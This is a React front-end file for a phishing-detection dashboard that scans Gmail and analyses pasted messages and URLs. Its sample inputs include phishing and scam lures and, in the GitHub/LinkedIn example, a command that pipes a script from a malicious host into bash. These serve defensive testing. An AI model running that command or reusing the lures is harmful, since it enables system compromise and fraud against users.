import { useEffect, useRef, useState } from "react";
import {
  ShieldCheck,
  Mail,
  Activity,
  Settings,
  Search,
  ChevronRight,
  AlertTriangle,
  CheckCircle2,
  Circle,
  RefreshCw,
  ExternalLink,
  MessageSquare,
  Briefcase,
  Link as LinkIcon,
  Globe
} from "lucide-react";

import "./App.css";

const API = "http://localhost:5000";

function Metric({ label, value, change, danger }) {
  return (
    <div className="metric">
      <p>{label}</p>
      <div className={`metric-value ${danger ? "danger-text" : ""}`}>
        {value}
      </div>
      <span>{change}</span>
    </div>
  );
}

const MODES = [
  {
    id: "email",
    label: "Email",
    icon: Mail,
    placeholder: "Paste email subject, sender, and body here...",
    sample: "URGENT: Your account access will be suspended within 24 hours due to suspicious activity. Please verify your password immediately at http://verify-account-login.com to avoid account deactivation."
  },
  {
    id: "message",
    label: "Messages",
    icon: MessageSquare,
    placeholder: "Paste SMS, WhatsApp, or chat message here...",
    sample: "Dear customer, your bank KYC has expired today. Your electricity and bank account will be blocked tonight. Share your 6-digit OTP immediately to avoid disconnection."
  },
  {
    id: "job",
    label: "Job Offers",
    icon: Briefcase,
    placeholder: "Paste job offer, recruitment message, or internship details here...",
    sample: "Congratulations! Direct selection for Google Work From Home Internship. Guaranteed salary Rs 50,000/month. No interview needed. Pay Rs 1500 refundable registration fee to HR on Telegram @GoogleRecruiter."
  },
  {
    id: "github_linkedin",
    label: "GitHub / LinkedIn",
    icon: Globe,
    placeholder: "Paste GitHub issue, collaboration invite, or recruiter message here...",
    sample: "Hi Developer, loved your GitHub repo! We want to invite you to collaborate on our private Web3 project. To run the automated test suite, execute: curl -s https://malicious-build.xyz/setup.sh | bash"
  },
  {
    id: "url",
    label: "URLs",
    icon: LinkIcon,
    placeholder: "Enter URL to check (e.g. https://paypal.com-security.net/login)...",
    sample: "http://paypal.com-security.net/login/auth"
  }
];

function App() {
  const [active, setActive] = useState("Overview");
  const [connected, setConnected] = useState(false);
  const [account, setAccount] = useState("");
  const [emails, setEmails] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [search, setSearch] = useState("");

  // Analyzer States
  const [analysisMode, setAnalysisMode] = useState("message");
  const [inputText, setInputText] = useState("");
  const [inputUrl, setInputUrl] = useState("");
  const [analyzing, setAnalyzing] = useState(false);
  const [analysisResult, setAnalysisResult] = useState(null);
  const [analysisError, setAnalysisError] = useState("");

  const scanningRef = useRef(false);

  // =================================================
  // INITIAL CHECK + BACKGROUND SCANNING
  // =================================================

  useEffect(() => {
    checkAccount();

    const interval = setInterval(() => {
      if (!connected) {
        checkAccount(true);
      } else {
        loadEmails(true);
      }
    }, 5000);

    return () => {
      clearInterval(interval);
    };
  }, [connected]);

  // =================================================
  // CHECK GMAIL CONNECTION & HEALTH
  // =================================================

  async function checkAccount(silent = false, retries = 2) {
    try {
      if (!silent) {
        setLoading(true);
        setError("");
      }

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 6000);

      const response = await fetch(
        `${API}/api/account?_t=${Date.now()}`,
        {
          cache: "no-store",
          signal: controller.signal
        }
      );
      clearTimeout(timeoutId);

      if (!response.ok) {
        throw new Error("Cannot connect to security backend.");
      }

      const data = await response.json();
      setError("");

      if (data.connected) {
        setConnected(true);
        setAccount(data.email || "");
        await loadEmails(false);
      } else {
        setConnected(false);
        setAccount("");
      }
    } catch (err) {
      console.error("Account check error:", err);
      if (retries > 0) {
        await new Promise((r) => setTimeout(r, 1200));
        return checkAccount(silent, retries - 1);
      }
      if (!silent) {
        setError("Cannot connect to security backend. Please ensure the backend service is running on port 5000.");
      }
    } finally {
      if (!silent) {
        setLoading(false);
      }
    }
  }

  // =================================================
  // LOAD GMAIL EMAILS
  // =================================================

  async function loadEmails(silent = false) {
    if (scanningRef.current) return;
    scanningRef.current = true;

    try {
      if (!silent) setLoading(true);
      if (!silent) setError("");

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 8000);

      const response = await fetch(
        `${API}/api/emails?_t=${Date.now()}`,
        {
          method: "GET",
          cache: "no-store",
          signal: controller.signal,
          headers: {
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
          }
        }
      );
      clearTimeout(timeoutId);

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Unable to load emails");
      }

      setEmails(data.emails || []);
      setConnected(data.connected !== false);
      setAccount(data.account || "");

      if (silent) {
        console.log(`[Sentinel] Background scan complete: ${data.emails?.length || 0} emails`);
      }
    } catch (err) {
      console.error("Email loading error:", err);
      if (!silent) {
        setError(err.message || "Unable to load emails");
      }
    } finally {
      scanningRef.current = false;
      if (!silent) setLoading(false);
    }
  }

  // =================================================
  // MULTI-MODE ANALYZER ACTION
  // =================================================

  async function handleAnalyze() {
    setAnalysisError("");
    setAnalysisResult(null);

    const isUrlMode = analysisMode === "url";
    const value = isUrlMode ? inputUrl.trim() : inputText.trim();

    if (!value) {
      setAnalysisError(
        isUrlMode
          ? "Please enter or paste a valid URL to analyze."
          : "Please enter or paste the message text to analyze."
      );
      return;
    }

    try {
      setAnalyzing(true);
      const res = await fetch(`${API}/api/analyze`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: analysisMode,
          text: isUrlMode ? "" : value,
          url: isUrlMode ? value : ""
        })
      });

      const data = await res.json();
      if (!res.ok) {
        throw new Error(data.error || "Analysis failed. Please try again.");
      }

      setAnalysisResult(data);
    } catch (err) {
      console.error("Analysis error:", err);
      setAnalysisError(err.message || "Failed to communicate with the security backend.");
    } finally {
      setAnalyzing(false);
    }
  }

  function handleClear() {
    setInputText("");
    setInputUrl("");
    setAnalysisResult(null);
    setAnalysisError("");
  }

  function handleLoadSample() {
    const activeObj = MODES.find((m) => m.id === analysisMode);
    if (!activeObj) return;

    if (analysisMode === "url") {
      setInputUrl(activeObj.sample);
    } else {
      setInputText(activeObj.sample);
    }
    setAnalysisResult(null);
    setAnalysisError("");
  }

  // =================================================
  // CONNECT GMAIL
  // =================================================

  function connectGmail() {
    window.location.href = `${API}/auth/google`;
  }

  // =================================================
  // SEARCH FILTER
  // =================================================

  const filteredEmails = emails.filter((email) => {
    const text = `
      ${email.from || ""}
      ${email.subject || ""}
      ${email.snippet || ""}
      ${email.risk || ""}
      ${email.aiPrediction || ""}
    `.toLowerCase();

    return text.includes(search.toLowerCase());
  });

  // =================================================
  // METRICS
  // =================================================

  const highRisk = emails.filter((email) => email.risk === "HIGH").length;
  const mediumRisk = emails.filter((email) => email.risk === "MEDIUM").length;
  const threats = highRisk + mediumRisk;

  const securityScore =
    emails.length === 0
      ? 100
      : Math.max(0, 100 - highRisk * 15 - mediumRisk * 5);

  // =================================================
  // NAVIGATION
  // =================================================

  const navigation = [
    { name: "Overview", icon: ShieldCheck },
    { name: "Mail Security", icon: Mail },
    { name: "Accounts", icon: ShieldCheck },
    { name: "Activity", icon: Activity },
    { name: "Settings", icon: Settings }
  ];

  const currentModeObj = MODES.find((m) => m.id === analysisMode) || MODES[1];

  return (
    <div className="app">
      {/* SIDEBAR */}
      <aside className="sidebar">
        <div className="brand">
          <div className="brand-mark">
            <ShieldCheck size={21} />
          </div>
          <div>
            <h2>SENTINEL</h2>
            <span>PERSONAL SECURITY</span>
          </div>
        </div>

        <nav>
          <p className="nav-label">COMMAND</p>
          {navigation.map((item) => {
            const Icon = item.icon;
            return (
              <button
                key={item.name}
                className={`nav-item ${active === item.name ? "active" : ""}`}
                onClick={() => setActive(item.name)}
              >
                <Icon size={17} />
                <span>{item.name}</span>
              </button>
            );
          })}
        </nav>

        <div className="sidebar-bottom">
          <div className="system-status">
            <Circle size={8} fill="currentColor" />
            <span>{loading ? "SYNCING..." : "SYSTEM ACTIVE"}</span>
          </div>
          <div className="version">LOCAL SECURITY NODE · 01</div>
        </div>
      </aside>

      {/* MAIN */}
      <main className="main">
        <header className="topbar">
          <div>
            <p className="eyebrow">SECURITY COMMAND CENTER</p>
            <h1>{active}</h1>
          </div>

          <div className="top-actions">
            <div className="search">
              <Search size={16} />
              <input
                placeholder="Search activity..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
              />
              <kbd>Ctrl K</kbd>
            </div>
            <div className="avatar">S</div>
          </div>
        </header>

        {/* BACKEND ERROR BANNER */}
        {error && (
          <div className="analysis-alert error" style={{ marginBottom: "20px" }}>
            <AlertTriangle size={18} />
            <div style={{ flex: 1 }}>
              <strong>Security backend notice:</strong> {error}
            </div>
            <button className="text-button" onClick={() => checkAccount(false)}>
              <RefreshCw size={13} /> Retry
            </button>
          </div>
        )}

        {/* OVERVIEW TAB */}
        {active === "Overview" && (
          <>
            {/* GMAIL STATUS BANNER (DISCONNECTED) */}
            {!connected && (
              <div className="gmail-connect-banner">
                <div className="gmail-banner-info">
                  <div className="account-icon">
                    <Mail size={17} />
                  </div>
                  <div>
                    <strong>Gmail Inbox Scanner Disconnected</strong>
                    <span>
                      Connect your Gmail with read-only permissions for automated continuous background phishing scans.
                    </span>
                  </div>
                </div>
                <button className="connect-button" onClick={connectGmail}>
                  <Mail size={15} />
                  Connect Gmail
                  <ExternalLink size={13} />
                </button>
              </div>
            )}

            {/* CONNECTED HERO & METRICS */}
            {connected && (
              <>
                <section className="hero">
                  <div>
                    <p className="section-label">DIGITAL SECURITY STATUS</p>
                    <div className="health-row">
                      <span className="health-number">{securityScore}</span>
                      <span className="health-unit">/100</span>
                    </div>
                    <p className="health-description">
                      {account && (
                        <>
                          Monitoring <strong>{account}</strong>
                        </>
                      )}
                    </p>
                  </div>

                  <div className="health-ring">
                    <div>
                      <ShieldCheck size={25} />
                      <span>{securityScore >= 80 ? "SECURE" : "REVIEW"}</span>
                    </div>
                  </div>
                </section>

                <section className="metrics">
                  <Metric
                    label="EMAILS SCANNED"
                    value={emails.length}
                    change="Gmail API"
                  />
                  <Metric
                    label="THREATS DETECTED"
                    value={String(threats).padStart(2, "0")}
                    change={`${highRisk} high risk`}
                    danger={highRisk > 0}
                  />
                  <Metric
                    label="ACCOUNT"
                    value="01"
                    change="Gmail connected"
                  />
                  <Metric
                    label="AI ENGINE"
                    value="ACTIVE"
                    change="Hybrid AI (ML+Rules)"
                  />
                </section>
              </>
            )}

            {/* ================================================= */}
            {/* SECTION: ANALYZE A MESSAGE OR LINK                */}
            {/* ================================================= */}
            <section className="panel analyze-panel">
              <div className="panel-header">
                <div>
                  <p className="section-label">THREAT DETECTION WORKBENCH</p>
                  <h3>Analyze a Message or Link</h3>
                </div>
                <div className="sample-actions">
                  <button className="text-button" onClick={handleLoadSample}>
                    Load Example
                  </button>
                </div>
              </div>

              {/* MODE SELECTOR */}
              <div className="mode-selector">
                {MODES.map((mode) => {
                  const Icon = mode.icon;
                  return (
                    <button
                      key={mode.id}
                      className={`mode-btn ${analysisMode === mode.id ? "active" : ""}`}
                      onClick={() => {
                        setAnalysisMode(mode.id);
                        setAnalysisError("");
                        setAnalysisResult(null);
                      }}
                    >
                      <Icon size={14} />
                      <span>{mode.label}</span>
                    </button>
                  );
                })}
              </div>

              {/* INPUT FORM */}
              <div className="analyze-body">
                {analysisMode === "url" ? (
                  <input
                    type="text"
                    className="analyze-input"
                    placeholder={currentModeObj.placeholder}
                    value={inputUrl}
                    onChange={(e) => setInputUrl(e.target.value)}
                    onKeyDown={(e) => e.key === "Enter" && handleAnalyze()}
                  />
                ) : (
                  <textarea
                    className="analyze-textarea"
                    rows={5}
                    placeholder={currentModeObj.placeholder}
                    value={inputText}
                    onChange={(e) => setInputText(e.target.value)}
                  />
                )}

                <div className="analyze-actions">
                  <button
                    className="connect-button analyze-submit-btn"
                    onClick={handleAnalyze}
                    disabled={analyzing}
                  >
                    {analyzing ? (
                      <RefreshCw size={14} className="spin" />
                    ) : (
                      <ShieldCheck size={15} />
                    )}
                    {analyzing
                      ? "Evaluating Security Indicators..."
                      : analysisMode === "url"
                      ? "Check URL"
                      : "Analyze Message"}
                  </button>

                  <button
                    className="text-button clear-btn"
                    onClick={handleClear}
                    disabled={analyzing}
                  >
                    Clear
                  </button>
                </div>

                {/* ERROR NOTIFICATION */}
                {analysisError && (
                  <div className="analysis-alert error">
                    <AlertTriangle size={16} />
                    <span>{analysisError}</span>
                  </div>
                )}

                {/* RESULTS PANEL */}
                {analysisResult && (
                  <div
                    className={`analysis-result-card risk-${analysisResult.risk_level.toLowerCase()}`}
                  >
                    <div className="result-header">
                      <div className="result-risk-badge">
                        {analysisResult.risk_level === "HIGH" && (
                          <AlertTriangle size={15} />
                        )}
                        {analysisResult.risk_level === "MEDIUM" && (
                          <AlertTriangle size={15} />
                        )}
                        {analysisResult.risk_level === "LOW" && (
                          <CheckCircle2 size={15} />
                        )}
                        <span>{analysisResult.risk_level} RISK</span>
                      </div>

                      <div className="result-score-tag">
                        <span>Risk Score: </span>
                        <strong>{analysisResult.risk_score} / 100</strong>
                      </div>
                    </div>

                    {/* SCORE PROGRESS BAR */}
                    <div className="risk-meter-bar">
                      <div
                        className={`risk-meter-fill fill-${analysisResult.risk_level.toLowerCase()}`}
                        style={{
                          width: `${Math.max(5, analysisResult.risk_score)}%`
                        }}
                      />
                    </div>

                    <p className="result-summary">{analysisResult.message}</p>

                    {/* REASONS BREAKDOWN */}
                    <div className="result-reasons">
                      <p className="section-label">DETECTED REASONS & INDICATORS</p>
                      <ul>
                        {analysisResult.reasons &&
                          analysisResult.reasons.map((r, i) => (
                            <li key={i}>
                              <span className="reason-bullet" />
                              <span>{r}</span>
                            </li>
                          ))}
                      </ul>
                    </div>

                    {/* DISCLAIMER / TECHNICAL NOTE */}
                    {analysisResult.details?.disclaimer && (
                      <div className="result-disclaimer">
                        <span>NOTE:</span> {analysisResult.details.disclaimer}
                      </div>
                    )}
                  </div>
                )}
              </div>
            </section>

            {/* RECENT EMAIL ACTIVITY (WHEN CONNECTED) */}
            {connected && (
              <section className="content-grid" style={{ marginTop: "24px" }}>
                <div className="panel">
                  <div className="panel-header">
                    <div>
                      <p className="section-label">LIVE FEED</p>
                      <h3>Recent Email Activity</h3>
                    </div>
                    <button className="text-button" onClick={() => loadEmails(false)}>
                      <RefreshCw size={13} /> Refresh
                    </button>
                  </div>

                  <div>
                    {filteredEmails.length === 0 ? (
                      <div style={{ padding: "40px", textAlign: "center", color: "#666" }}>
                        No emails found in scanned inbox.
                      </div>
                    ) : (
                      filteredEmails.slice(0, 6).map((email) => (
                        <div key={email.id} className="activity-row">
                          <div
                            className={`activity-icon ${
                              email.risk === "HIGH" ? "danger" : "safe"
                            }`}
                          >
                            {email.risk === "HIGH" ? (
                              <AlertTriangle size={15} />
                            ) : (
                              <CheckCircle2 size={15} />
                            )}
                          </div>
                          <div className="activity-info">
                            <strong>{email.subject}</strong>
                            <span>From: {email.from}</span>
                          </div>
                          <span
                            className={`risk ${
                              email.risk === "HIGH"
                                ? "high"
                                : email.risk === "MEDIUM"
                                ? "medium"
                                : "low"
                            }`}
                          >
                            {email.risk}
                          </span>
                        </div>
                      ))
                    )}
                  </div>
                </div>

                <div className="panel">
                  <div className="panel-header">
                    <div>
                      <p className="section-label">CONNECTED NODES</p>
                      <h3>Monitored Accounts</h3>
                    </div>
                  </div>

                  <div className="accounts">
                    <div className="account">
                      <div className="account-icon">
                        <Mail size={17} />
                      </div>
                      <div>
                        <strong>{account || "Gmail Account"}</strong>
                        <span className="connected">Connected & Monitored</span>
                      </div>
                      <ChevronRight size={15} color="#4d575f" />
                    </div>
                  </div>
                </div>
              </section>
            )}
          </>
        )}

        {/* MAIL SECURITY TAB */}
        {active === "Mail Security" && (
          <section className="panel threat-panel">
            <div className="panel-header">
              <div>
                <p className="section-label">EMAIL AUDIT</p>
                <h3>Scanned Messages</h3>
              </div>
              <button className="text-button" onClick={() => loadEmails(false)}>
                <RefreshCw size={13} /> Refresh
              </button>
            </div>

            {emails.length === 0 ? (
              <div style={{ padding: "40px", textAlign: "center", color: "#666" }}>
                {!connected
                  ? "Connect your Gmail account on the Overview tab to inspect inbox messages."
                  : "No emails scanned yet."}
              </div>
            ) : (
              <div className="threat-table">
                <div className="table-head">
                  <span>SENDER</span>
                  <span>SUBJECT</span>
                  <span>DATE</span>
                  <span>RISK</span>
                </div>

                {filteredEmails.map((email) => (
                  <div key={email.id} className="table-row">
                    <span className="sender">{email.from}</span>
                    <span className="subject">{email.subject}</span>
                    <span className="time">
                      {email.date ? email.date.slice(0, 16) : "Recent"}
                    </span>
                    <span
                      className={`risk ${
                        email.risk === "HIGH"
                          ? "high"
                          : email.risk === "MEDIUM"
                          ? "medium"
                          : "low"
                      }`}
                    >
                      {email.risk} ({email.finalScore || email.score}%)
                    </span>
                  </div>
                ))}
              </div>
            )}
          </section>
        )}

        {/* ACCOUNTS TAB */}
        {active === "Accounts" && (
          <section className="panel" style={{ marginTop: "16px" }}>
            <div className="panel-header">
              <div>
                <p className="section-label">ACCOUNTS MANAGEMENT</p>
                <h3>Connected Inbox Accounts</h3>
              </div>
            </div>
            <div style={{ padding: "24px" }}>
              {connected ? (
                <div>
                  <p style={{ color: "#a5b4bc", fontSize: "13px" }}>
                    Connected Account: <strong>{account}</strong>
                  </p>
                  <p style={{ color: "#66727d", fontSize: "11px" }}>
                    Status: Read-only protection active.
                  </p>
                </div>
              ) : (
                <div>
                  <p style={{ color: "#a5b4bc", fontSize: "13px" }}>
                    No Google account is currently linked.
                  </p>
                  <button
                    className="connect-button"
                    onClick={connectGmail}
                    style={{ marginTop: "12px" }}
                  >
                    <Mail size={15} /> Connect Gmail Account
                  </button>
                </div>
              )}
            </div>
          </section>
        )}

        {/* ACTIVITY TAB */}
        {active === "Activity" && (
          <section className="panel" style={{ marginTop: "16px" }}>
            <div className="panel-header">
              <div>
                <p className="section-label">SYSTEM AUDIT</p>
                <h3>Security Event Log</h3>
              </div>
            </div>
            <div style={{ padding: "24px", color: "#77838e", fontSize: "12px" }}>
              <p>• Local Security Node online</p>
              <p>• Multi-mode AI Security Engine ready (Email, SMS/WhatsApp, Jobs, GitHub/LinkedIn, URLs)</p>
              {connected && <p>• Gmail background polling enabled for {account}</p>}
            </div>
          </section>
        )}

        {/* SETTINGS TAB */}
        {active === "Settings" && (
          <section className="panel" style={{ marginTop: "16px" }}>
            <div className="panel-header">
              <div>
                <p className="section-label">PREFERENCES</p>
                <h3>Security Configuration</h3>
              </div>
            </div>
            <div style={{ padding: "24px", color: "#8a96a0", fontSize: "12px", lineHeight: "1.8" }}>
              <p><strong>AI Decision Pipeline:</strong> TF-IDF Logistic Regression + Knowledge-based Expert Rules + Bayesian Risk + Fuzzy Logic</p>
              <p><strong>Offline URL Heuristics:</strong> Active (no external network lookups)</p>
              <p><strong>OAuth Scope:</strong> https://www.googleapis.com/auth/gmail.readonly</p>
            </div>
          </section>
        )}
      </main>
    </div>
  );
}

export default App;